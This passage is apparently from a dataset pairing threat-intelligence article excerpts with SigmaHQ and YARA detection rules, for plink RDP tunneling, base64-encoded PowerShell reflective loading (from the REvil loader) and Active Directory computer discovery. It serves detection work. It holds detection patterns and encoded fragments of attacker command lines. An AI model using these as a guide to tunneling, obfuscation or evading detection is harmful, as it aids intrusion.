    "url": "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/",
    "markdown": "# Malicious IIS extensions quietly open persistent backdoors into servers **Published on July 26, 2022** --- Attackers are increasingly leveraging Internet Information Services (IIS) extensions as covert backdoors into servers, which hide deep in target environments and provide a durable persistence mechanism for attackers. While prior research has been published on specific incidents and variants, little is generally known about how attackers leverage the IIS platform as a backdoor. Malicious IIS extensions are less frequently encountered in attacks against servers, with attackers often only using script web shells as the first stage payload. This leads to a relatively lower detection",
    "sigma_rule": {
      "title": "Potential RDP Tunneling Via Plink",
      "id": "f38ce0b9-5e97-4b47-a211-7dc8d8b871da",
      "related": [
        {
          "id": "f7d7ebd5-a016-46e2-9c54-f9932f2d386d",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Execution of plink to perform data exfiltration and tunneling",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2022/07/26/malicious-iis-extensions-quietly-open-persistent-backdoors-into-servers/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-08-04",
      "modified": "2023-01-27",
      "tags": [
        "attack.command-and-control",
        "attack.t1572"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_a": {
          "Image|endswith": "\\plink.exe",
          "CommandLine|contains": ":127.0.0.1:3389"
        },
        "selection_b1": {
          "Image|endswith": "\\plink.exe",
          "CommandLine|contains": ":3389"
        },
        "selection_b2": {
          "CommandLine|contains": [
            " -P 443",
            " -P 22"
          ]
        },
        "condition": "selection_a or all of selection_b*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_plink_susp_tunneling.yml"
  },
  "325": {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story **Categories:** cobaltstrike gootloader lazagne psexec **Published on:** May 9, 2022 --- In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector. The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents. ## Background Gootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The",
    "sigma_rule": {
      "title": "PowerShell Base64 Encoded Invoke Keyword",
      "id": "6385697e-9f1b-40bd-8817-f4a91f40508e",
      "related": [
        {
          "id": "fd6e2919-3936-40c9-99db-0aa922c356f7",
          "type": "obsolete"
        }
      ],
      "status": "test",
      "description": "Detects UTF-8 and UTF-16 Base64 encoded powershell 'Invoke-' calls",
      "references": [
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "pH-T (Nextron Systems), Harjot Singh, @cyb3rjy0t",
      "date": "2022-05-20",
      "modified": "2023-04-06",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.defense-evasion",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli_enc": {
          "CommandLine|contains": " -e"
        },
        "selection_cli_invoke": {
          "CommandLine|contains": [
            "SQBuAHYAbwBrAGUALQ",
            "kAbgB2AG8AawBlAC0A",
            "JAG4AdgBvAGsAZQAtA",
            "SW52b2tlL",
            "ludm9rZS",
            "JbnZva2Ut"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_invoke.yml"
  },
  "326": {
    "url": "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
    "markdown": "# Raccine / yara / mal_revil.yar ``` rule MAL_REvil_Dec20 { meta: description = \"Detects PowerShell invocation as used by REvil loader\" author = \"Florian Roth\" date = \"2020-12-02\" reference = \"https://app.any.run/tasks/b5146ffd-328f-4d6f-9bf7-c544d02f1d47/\" score = 60 strings: /* Encoded Command */ $ = \" -Enc \\\"PAA\" ascii /* [Reflection.Assembly]::Load( */ $ = \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" ascii $ = \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" ascii $ = \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\" ascii /* Win32_Shadowcopy | ForEach-Object */ $ = \"VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA\" ascii $ = \"cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A\" ascii $ = \"XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA\" ascii condition: 1 of them } ```",
    "sigma_rule": {
      "title": "PowerShell Base64 Encoded Reflective Assembly Load",
      "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
      "related": [
        {
          "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects base64 encoded .NET reflective loading of Assembly",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "Christian Burkard (Nextron Systems), pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.defense-evasion",
        "attack.t1027",
        "attack.t1620"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA",
            "AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC",
            "BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp",
            "AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK",
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA",
            "WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load.yml"
  },
  "327": {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story **Categories:** cobaltstrike gootloader lazagne psexec **Published on:** May 9, 2022 --- In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector. The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents. ## Background Gootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The",
    "sigma_rule": {
      "title": "PowerShell Base64 Encoded Reflective Assembly Load",
      "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
      "related": [
        {
          "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects base64 encoded .NET reflective loading of Assembly",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/"
      ],
      "author": "Christian Burkard (Nextron Systems), pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-01-30",
      "tags": [
        "attack.execution",
        "attack.t1059.001",
        "attack.defense-evasion",
        "attack.t1027",
        "attack.t1620"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA",
            "AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC",
            "BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp",
            "AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK",
            "WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ",
            "sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA",
            "bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA",
            "WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA",
            "sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA",
            "bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load.yml"
  },
  "328": {
    "url": "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
    "markdown": "# Raccine / yara / mal_revil.yar ``` rule MAL_REvil_Dec20 { meta: description = \"Detects PowerShell invocation as used by REvil loader\" author = \"Florian Roth\" date = \"2020-12-02\" reference = \"https://app.any.run/tasks/b5146ffd-328f-4d6f-9bf7-c544d02f1d47/\" score = 60 strings: /* Encoded Command */ $ = \" -Enc \\\"PAA\" ascii /* [Reflection.Assembly]::Load( */ $ = \"WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA\" ascii $ = \"sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA\" ascii $ = \"bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA\" ascii /* Win32_Shadowcopy | ForEach-Object */ $ = \"VwBpAG4AMwAyAF8AUwBoAGEAZABvAHcAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQA\" ascii $ = \"cAaQBuADMAMgBfAFMAaABhAGQAbwB3AGMAbwBwAHkAIAB8ACAARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A\" ascii $ = \"XAGkAbgAzADIAXwBTAGgAYQBkAG8AdwBjAG8AcAB5ACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdA\" ascii condition: 1 of them } ```",
    "sigma_rule": {
      "title": "Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call",
      "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
      "related": [
        {
          "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0"
      ],
      "author": "pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-04-06",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1059.001",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ",
            "oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA",
            "6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ",
            "oAOgAoACIATABvACIAKwAiAGEAZAAiACkA",
            "6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ",
            "oAOgAoACIATABvAGEAIgArACIAZAAiACkA",
            "6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA",
            "OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ",
            "oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA",
            "6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ",
            "oAOgAoACcATABvACcAKwAnAGEAZAAnACkA",
            "6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ",
            "oAOgAoACcATABvAGEAJwArACcAZAAnACkA",
            "6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml"
  },
  "329": {
    "url": "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
    "markdown": "# SEO Poisoning – A Gootloader Story **Categories:** cobaltstrike gootloader lazagne psexec **Published on:** May 9, 2022 --- In early February 2022, we witnessed an intrusion employing Gootloader (aka GootKit) as the initial access vector. The intrusion lasted two days and comprised discovery, persistence, lateral movement, collection, defense evasion, credential access, and command and control activity. During the post-exploitation phase, the threat actors used RDP, WMI, Mimikatz, Lazagne, WMIExec, and SharpHound. The threat actors then used this access to review sensitive documents. ## Background Gootloader was the name assigned to the multi-staged payload distribution by Sophos in March 2021. The",
    "sigma_rule": {
      "title": "Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call",
      "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
      "related": [
        {
          "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0"
      ],
      "author": "pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-04-06",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1059.001",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ",
            "oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA",
            "6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ",
            "oAOgAoACIATABvACIAKwAiAGEAZAAiACkA",
            "6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ",
            "oAOgAoACIATABvAGEAIgArACIAZAAiACkA",
            "6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA",
            "OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ",
            "oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA",
            "6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ",
            "oAOgAoACcATABvACcAKwAnAGEAZAAnACkA",
            "6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ",
            "oAOgAoACcATABvAGEAJwArACcAZAAnACkA",
            "6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml"
  },
  "330": {
    "url": "https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0",
    "markdown": "# AppDomain.Load Method ## Definition **Namespace:** System **Assembly:** - System.Runtime.dll - System.Runtime.Extensions.dll - mscorlib.dll - netstandard.dll > **Important** > Some information relates to prerelease product that may be substantially modified before it’s released. Microsoft makes no warranties, express or implied, with respect to the information provided here. ### Summary Loads an Assembly into this application domain. ## Overloads | Method | Description | |--------|-------------| | [Load(Byte[])](https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0#system-appdomain-load(system-byte())) | Loads the Assembly with a common object file format (COFF) based image containing an emitted Assembly. | | Load(AssemblyName)) | Loads an Assembly given its AssemblyName. | | Load(String)) | Loads an Assembly",
    "sigma_rule": {
      "title": "Suspicious Encoded And Obfuscated Reflection Assembly Load Function Call",
      "id": "9c0295ce-d60d-40bd-bd74-84673b7592b1",
      "related": [
        {
          "id": "62b7ccc9-23b4-471e-aa15-6da3663c4d59",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious base64 encoded and obfuscated \"LOAD\" keyword used in .NET \"reflection.assembly\"",
      "references": [
        "https://github.com/Neo23x0/Raccine/blob/20a569fa21625086433dcce8bb2765d0ea08dcb6/yara/mal_revil.yar",
        "https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/",
        "https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load?view=net-7.0"
      ],
      "author": "pH-T (Nextron Systems)",
      "date": "2022-03-01",
      "modified": "2023-04-06",
      "tags": [
        "attack.execution",
        "attack.defense-evasion",
        "attack.t1059.001",
        "attack.t1027"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains": [
            "OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ",
            "oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA",
            "6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ",
            "oAOgAoACIATABvACIAKwAiAGEAZAAiACkA",
            "6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA",
            "OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ",
            "oAOgAoACIATABvAGEAIgArACIAZAAiACkA",
            "6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA",
            "OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ",
            "oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA",
            "6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ",
            "oAOgAoACcATABvACcAKwAnAGEAZAAnACkA",
            "6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA",
            "OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ",
            "oAOgAoACcATABvAGEAJwArACcAZAAnACkA",
            "6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA"
          ]
        },
        "condition": "selection"
      },
      "fields": [
        "CommandLine"
      ],
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml"
  },
  "331": {
    "url": "https://blog.talosintelligence.com/lazarus-three-rats/",
    "markdown": "# Lazarus and the tale of three RATs **Thursday, September 8, 2022 08:01** Threat Spotlight - Cisco Talos has been tracking a new campaign operated by the Lazarus APT group, attributed to North Korea by the United States government. - This campaign involved the exploitation of vulnerabilities in VMWare Horizon to gain an initial foothold into targeted organizations. - Targeted organizations include energy providers from around the world, including those headquartered in the United States, Canada, and Japan. - The campaign is meant to infiltrate organizations around the world for establishing long-term access and subsequently exfiltrating data of interest to",
    "sigma_rule": {
      "title": "Computer Discovery And Export Via Get-ADComputer Cmdlet",
      "id": "435e10e4-992a-4281-96f3-38b11106adde",
      "related": [
        {
          "id": "db885529-903f-4c5d-9864-28fe199e6370",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
        "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-10",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADComputer ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_computer_discovery_get_adcomputer.yml"
  },
  "332": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
    "markdown": "# Defenders beware: A case for post-ransomware investigations **October 18, 2022** Ransomware is one of the most pervasive threats that Microsoft Detection and Response Team (DART) responds to today. The groups behind these attacks continue to add sophistication to their tactics, techniques, and procedures (TTPs) as most network security postures increase. In this blog, we detail a recent ransomware incident in which the attacker used a collection of commodity tools and techniques, such as using living-off-the-land binaries, to launch their malicious code. Cobalt Strike was used for persistence on the network with NT AUTHORITY/SYSTEM (local SYSTEM) privileges to maintain access",
    "sigma_rule": {
      "title": "Computer Discovery And Export Via Get-ADComputer Cmdlet",
      "id": "435e10e4-992a-4281-96f3-38b11106adde",
      "related": [
        {
          "id": "db885529-903f-4c5d-9864-28fe199e6370",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
        "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-10",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADComputer ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_computer_discovery_get_adcomputer.yml"
  },
  "333": {
    "url": "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf",
    "markdown": "",
    "sigma_rule": {
      "title": "Computer Discovery And Export Via Get-ADComputer Cmdlet",
      "id": "435e10e4-992a-4281-96f3-38b11106adde",
      "related": [
        {
          "id": "db885529-903f-4c5d-9864-28fe199e6370",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
      "references": [
        "https://blog.talosintelligence.com/lazarus-three-rats/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/",
        "https://www.cisa.gov/uscert/sites/default/files/publications/aa22-320a_joint_csa_iranian_government-sponsored_apt_actors_compromise_federal%20network_deploy_crypto%20miner_credential_harvester.pdf"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-11-10",
      "modified": "2022-11-17",
      "tags": [
        "attack.discovery",
        "attack.t1033"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": [
              "\\powershell.exe",
              "\\pwsh.exe"
            ]
          },
          {
            "OriginalFileName": [
              "PowerShell.EXE",
              "pwsh.dll"
            ]
          }
        ],
        "selection_cli": {
          "CommandLine|contains|all": [
            "Get-ADComputer ",
            " -Filter \\*"
          ],
          "CommandLine|contains": [
            " > ",
            " | Select ",
            "Out-File",
            "Set-Content",
            "Add-Content"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Legitimate admin scripts may use the same technique, it's better to exclude specific computers or users who execute these commands or scripts often"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_powershell_computer_discovery_get_adcomputer.yml"
  },
  "334": {
